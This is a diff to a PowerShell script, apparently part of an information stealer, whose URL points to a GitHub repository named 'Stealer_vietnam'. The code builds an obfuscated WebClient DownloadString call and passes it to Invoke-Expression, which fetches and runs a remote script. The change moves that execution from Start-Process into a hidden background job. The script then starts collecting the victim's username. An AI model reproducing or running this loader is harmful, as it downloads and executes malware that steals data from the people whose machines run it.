@@ -1,6 +1,14 @@
-$skibiditoilet = ("https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/taskkill.ps1")
+$skibiditoilet = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/taskkill.ps1"
 $dopdopyesyes = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$skibiditoilet')"
-Start-Process "powershell" -Argument "IEX($dopdopyesyes)" -NoNewWindow -PassThru
+
+# Tạo script block để thực thi script từ URL
+$scriptBlock = {
+    param ($url, $code)
+    Invoke-Expression $code
+}
+
+# Chạy script block trong job
+Start-Job -ScriptBlock $scriptBlock -ArgumentList $skibiditoilet, $dopdopyesyes
 
 # Lấy thông tin User
 $user = $env:username
